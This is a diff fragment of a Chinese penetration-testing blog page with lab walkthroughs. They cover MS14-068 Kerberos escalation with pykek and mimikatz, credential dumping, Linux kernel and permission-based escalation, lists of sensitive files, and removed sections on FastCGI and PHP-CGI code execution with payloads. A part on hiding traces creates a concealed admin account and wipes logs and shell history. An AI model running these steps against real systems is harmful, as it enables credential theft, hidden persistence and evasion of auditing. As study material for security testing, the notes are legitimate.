+<p>​    <img src="https://img-blog.csdnimg.cn/20190413165426948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190413165431859.png" alt="在这里插入图片描述"></p>
+<p>重启之后</p>
+<p><img src="https://img-blog.csdnimg.cn/20190413165438137.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>修改 Win2003 中的域控制器的用户权限</p>
+<ul>
+<li>Win2003 -&gt; 运行 -&gt; dsa.msc</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413165456477.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413165500666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ul>
+<li>Win7</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413165516801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ul>
+<li>win2003</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413165521164.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ul>
+<li>Win7 可以查看域控制器共享出来的文件等资源</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413165527351.png" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>使用漏洞代码攻击域控制器</p>
+<ul>
+<li><p>获取攻击文件</p>
+<pre><code>  # root@kali:~# searchsploit Ms14-068
+      ------------------------------------------ ----------------------------------
+       Exploit Title                            |  Path
+                                | (/usr/share/                    exploitdb/)
+      ------------------------------------------ ----------------------------------
+      Microsoft Windows Kerberos - Privilege Es | exploits/windows/remote/35474.py
+      ------------------------------------------ ---------------------------------
+  root@kali:~# cp /usr/share/exploitdb/exploits/windows/remote/35474.py .</code></pre></li>
+<li><p>域环境下使用通用工具查看本地密码</p>
+</li>
+</ul>
+<pre><code>  C:\fgdump&gt;PwDump.exe localhost    # 仅是本地密码
+  C:\&gt;wce-universal.exe    # 结果是域控制器密码
+  C:\&gt;wce-universal.exe -w
+      Administrator\LAB:jlcssadmin
+  C:\Win32&gt;mimikatz.exe
+  mimikatz # ::
+  mimikatz # privilege::debug
+      Privilege &#39;20&#39; OK
+  mimikatz # kerberos::list
+  mimikatz # sekurlsa::logonPasswords</code></pre><ul>
+<li>漏洞利用过程</li>
+</ul>
+<pre><code>  1. 首先在 kali 通过脚本生成一个票据文件
+      # ms14-068.py -u user@lab.com -s userSID -d dc.lab.com
+      -u 用户名:登录用户名
+      -s userSID
+      -d 域控制器名称：在 Win7 计算机名称处查看，不在域控是，可以用IP地址代替
+  2. 将票据文件拷贝到 win 系统里
+      # 拷贝 TGT_user1@lab.com.ccache 到windows系统
+  3. 在 win 系统里使用 mimikatz.exe 完成权限的提升
+      # mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit
+
+  # 在 Win7 上使用本地用户登录
+  # 查看域账号的信息
+  C:\&gt;net user
+      \\WIN7-VM 的用户帐户
+      Administrator            Guest                    John
+      user1                    user2
+      命令成功完成。
+  C:\Win32&gt;whoami.exe /all
+      [User]     = &quot;LAB\user3&quot;  S-1-5-21-3056505427-3800332898-2304591883-1111
+
+  # kali 报错缺少模块
+  root@kali:~# python 35474.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132
+
+  # 下载安装模块https://github.com/bidord/pykek
+</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165535193.png" alt="在这里插入图片描述"></p>
+</li>
+</ul>
+<pre><code>     root@kali:~/Desktop/pykek-master# python ms14-068.py -u user3@lab.com -s S-1-5-21-3056505427-3800332898-2304591883-1111 -d 172.16.10.132
+     Password: 
+       [+] Building AS-REQ for 172.16.10.132... Done!
+       [+] Sending AS-REQ to 172.16.10.132... Done!
+       [+] Receiving AS-REP from 172.16.10.132... Done!
+       [+] Parsing AS-REP from 172.16.10.132... Done!
+       [+] Building TGS-REQ for 172.16.10.132... Done!
+       [+] Sending TGS-REQ to 172.16.10.132... Done!
+       [+] Receiving TGS-REP from 172.16.10.132... Done!
+       [+] Parsing TGS-REP from 172.16.10.132... Done!
+       [+] Creating ccache file &#39;TGT_user1@lab.com.ccache&#39;... Done        
+     # 将文件拷贝到 Win7</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165539296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<pre><code>     # 在 Win7 下执行
+     C:\mimikatz\Win32&gt;mimikatz.exe log &quot;kerberos::ptc TGT_user3@lab.com.ccache&quot; exit
+ ![在这里插入图片描述](https://img-blog.csdnimg.cn/2019041316554383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70)
+
+     # 如果injecte成功 你有可能获得到了域管理session，那么klist看一下是否有了kerberos Ticket
+     C:\mimikatz\Win32&gt;klist
+         当前登录 ID 是 0:0x776bd
+         缓存的票证: (1)
+         #0&gt;     客户端: user3 @ LAB.COM
+             服务器: krbtgt/LAB.COM @ LAB.COM
+             Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)
+             票证标志 0x50a00000 -&gt; forwardable proxiable renewable pre_authent
+             开始时间: 3/4/2018 2:00:45 (本地)
+             结束时间:   3/4/2018 12:00:44 (本地)
+             续订时间: 3/11/2018 2:00:44 (本地)
+             会话密钥类型: RSADSI RC4-HMAC(NT)
+     C:\mimikatz\Win32&gt;net use \\Win2003.lab.com\admin$
+         命令成功完成。</code></pre><h5 id="利用-CVE-2012-0056-提升-linux-权限"><a href="#利用-CVE-2012-0056-提升-linux-权限" class="headerlink" title="利用 CVE-2012-0056 提升 linux 权限"></a>利用 CVE-2012-0056 提升 linux 权限</h5><ul>
+<li>是一个关于 /proc/pid/mem 的漏洞</li>
+<li>要求：linux 内核必须大于2.6.39</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413165547661.png" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>样例：使用 ubuntu11 系统</p>
+<ul>
+<li><a href="http://old-releases.ubuntu.com/releases/11.10/" target="_blank" rel="noopener">ubuntu11 官网链接（http://old-releases.ubuntu.com/releases/11.10/）</a></li>
+</ul>
+</li>
+<li><p>在 kali 中查询</p>
+<pre><code> root@kali:~# searchsploit 18411
+     --------------------------- ----------------------------------
+      Exploit Title             |  Path
+                                | (/usr/share/exploitdb/)
+     --------------------------- ----------------------------------
+     Linux Kernel 2.6.39 &lt; 3.2. | exploits/linux/local/18411.c
+     --------------------------- -------------------------------
+ root@kali:~# cp /usr/share/exploitdb/exploits/linux/local/18411.c .
+</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165552374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+</ul>
+<ul>
+<li>下载了 ubuntu11，安装之后 ssh 没办法使用，文件无法导入，故无法演示 ，过程是这样的，使用 kali-1.1.0 演示一下结kali-1.1.0 已经打了这个漏洞的补丁了，故无结果。</li>
+</ul>
+<h3 id="提权——利用配置不当提权"><a href="#提权——利用配置不当提权" class="headerlink" title="提权——利用配置不当提权"></a>提权——利用配置不当提权</h3><ul>
+<li>与漏洞提权相比更常用的方法 <ul>
+<li>企业环境 </li>
+<li>补丁更新的全部已经安装 </li>
+<li>输入变量过滤之外更值得研发关注的安全隐患 </li>
+<li>以system权限启动 </li>
+<li>NTFS权限允许users修改删除 </li>
+</ul>
+</li>
+<li>icacls<ul>
+<li>icacls c:\windows*.exe /save perm /T </li>
+<li>i586-mingw32msvc-gcc -o admin.exe admin.c </li>
+</ul>
+</li>
+<li>Find<ul>
+<li>find / -perm 777 -exec ls -l {} ; </li>
+</ul>
+</li>
+<li>应用系统的配置文件 <ul>
+<li>应用连接数据库的配置文件 </li>
+</ul>
+</li>
+</ul>
+<h5 id="1-NTFS权限允许-users-修改删除"><a href="#1-NTFS权限允许-users-修改删除" class="headerlink" title="1. NTFS权限允许 users 修改删除"></a>1. NTFS权限允许 users 修改删除</h5><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427212609.png" alt=""></p>
+<p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427212636.png" alt=""></p>
+<ul>
+<li>icacls 在 win2003 及以后的版本中存在，可以拷贝到 WinXP 中</li>
+</ul>
+<pre><code> C:\&gt;icacls boot.ini
+     boot.ini BUILTIN\Power Users:(RX)
+              BUILTIN\Administrators:(F)
+              NT AUTHORITY\SYSTEM:(F)
+
+     Successfully processed 1 files; Failed processing 0 files
+ # 如果 user 用户拥有 F（FULL）权限，则可以直接控制系统
+
+ # 查询各程序的权限情况
+ C:\&gt;icacls c:\windows\*.exe /save saveicacls /T
+</code></pre><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427213117.png" alt=""></p>
+<pre><code> BU：build user
+ PU：power user
+ BA：build administrator
+
+ 如果 BU 是 F 的话，则说明可以替换
+ 如果出现 FA；；；BU，则说明权限配置不当
+
+ # kali 下使用 c 文件生成 winXP 下的可执行程序
+ root@kali:~# i686-w64-mingw32-gcc -o admin.exe admin.c</code></pre><h5 id="2-linux-下查看权限"><a href="#2-linux-下查看权限" class="headerlink" title="2.linux 下查看权限"></a>2.linux 下查看权限</h5><pre><code>root@kali:~# ls -l
+find / -perm 777 -exec ls -l {} \;</code></pre><h5 id="3-应用系统的配置文件"><a href="#3-应用系统的配置文件" class="headerlink" title="3.应用系统的配置文件"></a>3.应用系统的配置文件</h5><pre><code>1. 应用连接数据库的配置文件
+2. 后台服务运行账号</code></pre><h3 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h3><h5 id="1-提权之后收集基本信息"><a href="#1-提权之后收集基本信息" class="headerlink" title="1. 提权之后收集基本信息"></a>1. 提权之后收集基本信息</h5><pre><code># Linux
+•/etc/resolv.conf
+•/etc/passwd
+•/etc/shadow
+•whoami and who –a
+•ifconfig -a, iptables -L -n, ifconfig –a, netstat –r
+•uname –a, ps aux
+•dpkg -l| head
+
+# Windows
+•ipconfig /all , ipconfig /displaydns, netstat -bnao , netstat –r
+•net view , net view /domain    # 查共享信息
+•net user /domain, net user %username% /domain  # 查域信息
+•net accounts, net share
+•net localgroup administrators username /add
+•net group &quot;Domain Controllers&quot; /domain
+•net share name$=C:\ /unlimited    # 把 C盘共享出来
+•net user username /active:yes /domain  # 域管理员重新启动被锁定账号
+</code></pre><h5 id="2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION"><a href="#2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION" class="headerlink" title="2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)"></a>2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</h5><pre><code>C:\Users\John&gt;wmic
+wmic:root\cli&gt;/?
+[global switches] &lt;command&gt;
+
+有效的全局开关有:
+/NAMESPACE           别名使用的名称空间路径。
+/ROLE                包含此别名定义的角色路径。
+/NODE                别名使用的服务器。
+/IMPLEVEL            客户模拟级别。
+/AUTHLEVEL           客户身份验证级别。
+/LOCALE              客户应用的语言识别符。
+/PRIVILEGES          启用或禁用所有特权。
+/TRACE               将调试信息输出到 stderr。
+/RECORD              将所有输入命令和输出写入日志。
+/INTERACTIVE         设置或重设交互模式。
+/FAILFAST            设置或重置 FailFast 模式。
+/USER                会话期间使用的用户。
+/PASSWORD            用于会话登录的密码。
+/OUTPUT              为输出重新定向指定模式。
+/APPEND              为输出重新定向指定模式。
+/AGGREGATE           设置或重置集合模式。
+/AUTHORITY           Specifies the &lt;authority type&gt; for the connection.
+/?[:&lt;BRIEF|FULL&gt;]    用法信息。
+
+
+
+•wmic nicconfig get ipaddress,macaddress
+•wmic computersystem get username
+•wmic netlogin get name,lastlogon
+•wmic process get caption, executablepath,commandline   # 提取软件安装信息
+•wmic process where name=“calc.exe&quot; call terminate  # 结束进程
+•wmic os get name,servicepackmajorversion       #提取操作系统的补丁版本
+•wmic product get name,version                  # 提取软件信息
+•wmic product where name=“name” call uninstall /nointeractive   # 静默删除
+•wmic share get /ALL                            # 提取共享文件夹
+•wmic /node:&quot;machinename&quot; path Win32_TerminalServiceSetting where  AllowTSConnections=&quot;0&quot; call SetAllowTSConnections &quot;1&quot;    # 开远程桌面
+•wmic nteventlog get path,filename, writeable   #查看日志目录
+
+
+
+C:\&gt;wmic nteventlog get path,filename, writeable
+FileName   Path                       Writeable
+appevent   \windows\system32\config\  TRUE
+ntds       \windows\system32\config\  TRUE
+dnsevent   \windows\system32\config\  TRUE
+ntfrs      \windows\system32\config\  TRUE
+secevent   \windows\system32\config\  TRUE
+sysevent   \windows\system32\config\  TRUE
+ThinPrint  \windows\system32\config\  TRUE
+</code></pre><h5 id="3-收集敏感信息"><a href="#3-收集敏感信息" class="headerlink" title="3. 收集敏感信息"></a>3. 收集敏感信息</h5><pre><code># Linux
+•/etc ；/usr/local/etc
+•/etc/passwd ；/etc/shadow
+•.ssh ；.gnupg 公私钥
+•The e-mail and data files
+•业务数据库 ；身份认证服务器数据库
+•/tmp
+
+# windows
+•SAM 数据库 ； 注册表文件
+•%SYSTEMROOT%\repair\SAM
+•%SYSTEMROOT%\System32\config\RegBack\SAM
+•业务数据库； 身份认证数据库
+•临时文件目录
+•UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\
+</code></pre><h3 id="清除渗透攻击痕迹"><a href="#清除渗透攻击痕迹" class="headerlink" title="清除渗透攻击痕迹"></a>清除渗透攻击痕迹</h3><ul>
+<li>最多也只是清除本地记录，如果有日志服务器的话还是会被记录下所有操作</li>
+<li>windows 系统</li>
+</ul>
+<pre><code>•禁止在登陆界面显示新建账号
+•REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersio\WinLogon\SpecialAccounts\UserList&quot; /v uname /T REG_DWORD /D 0
+•del %WINDIR%\*.log /a/s/q/f
+•History
+•日志
+•auth.log / secure
+•btmp / wtmp
+•lastlog / faillog
+•其他日志和 HIDS 等
+
+
+# 控制系统之后，新建账号并添加管理员组
+C:\&gt;net user user4 123456 /add
+命令成功完成。
+C:\&gt;net localgroup administrators user4 /add
+命令成功完成。
+# 这样开机登录的界面会显示这个账户
+# 可以通过添加注册表来隐藏
+REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0
+C:\&gt;REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0
+操作成功结束
+# 但是使用 net user 还是可以查看到这个账户
+
+
+# 强制静默删除日志
+C:\&gt;del %WINDIR%\*.log /a/s/q/f</code></pre><ul>
+<li>Linux 系统</li>
+</ul>
+<pre><code>root@kali:~# history
+# history 记录保存在 .bash_history
+root@kali:~# ls -l .bash_history 
+    -rw------- 1 root root 15418 3月   4 00:28 .bash_history
+# 擦除痕迹
+root@kali:~# history -c
+
+root@kali:~# lsattr
+    --------------e---- ./Downloads
+    --------------e---- ./Desktop
+    --------------e---- ./testDir
+    --------------e---- ./Pictures
+    --------------e---- ./Public
+    --------------e---- ./vmware-tools-patches
+    --------------e---- ./Videos
+    --------------e---- ./Documents
+    --------------e---- ./Music
+    --------------e---- ./Templates
+root@kali:~# chattr -h
+    Usage: chattr [-pRVf] [-+=aAcCdDeijPsStTu] [-v version] files...
+
+# 修改文件属性让其无法被写入数据
+root@kali:~# touch 456.txt
+root@kali:~# lsattr 456.txt 
+    --------------e---- 456.txt
+root@kali:~# ifconfig &gt; 456.txt 
+root@kali:~# chattr +i 456.txt 
+root@kali:~# lsattr 456.txt 
+    ----i---------e---- 456.txt
+root@kali:~# ifconfig &gt; 456.txt 
+    -bash: 456.txt: 不允许的操作
+
+# 修改 .bash_history，让其无法被写入，会变成只读文件
+root@kali:~# chattr +i .bash_history
+
+
+# 日志记录
+•auth.log / secure
+•btmp / wtmp
+•lastlog / faillog
+
+root@kali:~# cat /var/log/auth.log
+root@kali:~# cat /var/log/wtmp
+root@kali:~# lastlog
+    用户名           端口     来自             最后登陆时间
+    root             pts/3    172.16.10.1      日 3月  4 02:30:00 -0500 2018
+    daemon                                     **从未登录过**
+    bin                                        **从未登录过**
+    sys                                        **从未登录过**
+    sync                                       **从未登录过**
+    games                                      **从未登录过**
+    man                                        **从未登录过**
+    lp                                         **从未登录过**
+    mail                                       **从未登录过**
+    news                                       **从未登录过**
+    uucp                                       **从未登录过**
+    proxy                                      **从未登录过**
+    www-data                                   **从未登录过**
+    backup                                     **从未登录过**
+    list                                       **从未登录过**
+    irc                                        **从未登录过**
+    gnats                                      **从未登录过**
+    nobody                                     **从未登录过**</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/" itemprop="url">渗透测试——拒绝服务</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T19:58:09+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -5482,352 +6543,6 @@ POST:
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/" itemprop="url">其他中间件漏洞</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T10:49:25+08:00">
-                2020-04-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%85%B6%E4%BB%96%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index">
-                    <span itemprop="name">其他中间件漏洞</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="其它中间件相关漏洞"><a href="#其它中间件相关漏洞" class="headerlink" title="其它中间件相关漏洞"></a>其它中间件相关漏洞</h2><h4 id="FastCGI未授权访问、任意命令执行"><a href="#FastCGI未授权访问、任意命令执行" class="headerlink" title="FastCGI未授权访问、任意命令执行"></a>FastCGI未授权访问、任意命令执行</h4><p><strong>1、 漏洞简介及成因</strong></p>
-<p>服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。</p>
-<p>参考P牛文章：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
-<p><strong>2、 漏洞复现</strong></p>
-<p>使用vulhub实验环境，启动实验环境。</p>
-<pre><code>cd /vulhub/fpm
-docker-compose build &amp;&amp; docker-compose up -d</code></pre><p><strong>EXP</strong>:<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
-<p>在攻击机使用命令python fpm.py 192.168.237.136 /etc/passwd，观察返回结果。</p>
-<p><a href="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png!small" alt="img"></a></p>
-<p>由于访问非*.PHP文件，所以返回结果403。</p>
-<p>使用命令执行一个默认存在的 php 文件。</p>
-<pre><code>python fpm.py 192.168.237.136 /usr/local/lib/php/PEAR.php</code></pre><p><a href="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png!small" alt="img"></a></p>
-<p>利用命令进行任意命令执行复现。</p>
-<pre><code>python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `pwd`; ?&gt;&#39;
-python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ifconfig`; ?&gt;&#39;
-python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c &#39;&lt;?php echo `ls`; ?&gt;&#39;</code></pre><p><a href="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png!small" alt="img"></a></p>
-<p><strong>3、 漏洞修复</strong></p>
-<p>更改默认端口</p>
-<h3 id="（二）-PHPCGI远程代码执行"><a href="#（二）-PHPCGI远程代码执行" class="headerlink" title="（二） PHPCGI远程代码执行"></a>（二） PHPCGI远程代码执行</h3><p><strong>1、 漏洞简介及成因</strong></p>
-<p>在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。</p>
-<p>此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。</p>
-<p><a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a><br>p牛讲的很详细：<a href="https://vulhub.org/#/environments/php/CVE-2012-1823/" target="_blank" rel="noopener">https://vulhub.org/#/environments/php/CVE-2012-1823/</a></p>
-<p><strong>2、 漏洞复现</strong></p>
-<p>cgi模式下有如下一些参数可用：</p>
-<pre><code>-c 指定php.ini文件的位置
--n 不要加载php.ini文件
--d 指定配置项
--b 启动fastcgi进程
--s 显示文件源码
--T 执行指定次该文件
--h和-? 显示帮助</code></pre><p>通过使用<code>-d</code>指定<code>auto_prepend_file</code>来制造任意文件包含漏洞，执行任意代码：<br><code>auto_prepend_file</code>与<code>auto_append_file</code>:将文件require到所有页面的顶部与底部。<br>空格用<code>+</code>或<code>%20</code>代替，<code>=</code>用url编码代替。<br>payload：<code>-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></p>
-<p>使用vulhub实验环境，启动环境。</p>
-<p>访问<a href="http://192.168.139.129:8080/index.php。" target="_blank" rel="noopener">http://192.168.139.129:8080/index.php。</a></p>
-<p><a href="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png!small" alt="img"></a></p>
-<p>抓包，修改包。</p>
-<p><a href="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png!small" alt="img"></a></p>
-<p>命令成功执行。</p>
-<p><strong>3、 漏洞修复</strong></p>
-<p>三种方法：</p>
-<p>1）升级php版本；（php-5.3.12以上版本）;</p>
-<p>2）在apache上做文章，开启url过滤，把危险的命令行参数给过滤掉，由于这种方法修补比较简单，采用比较多吧。</p>
-<p>具体做法：</p>
-<p>修改http.conf文件，找到<Directory/>增加以下三行</p>
-<p>RewriteEngine on</p>
-<p>RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]</p>
-<p>RewriteRule ^(.*) $1? [L]</p>
-<p>重启一下apache即可，但是要考虑到，相当于每次request就要进行一次url过滤，如果访问量大的话，可能会增加apache的负担。</p>
-<p>3）打上php补丁。</p>
-<p>补丁下载地址:<a href="https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/tomcat-zhong-jian-jian-lou-dong/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
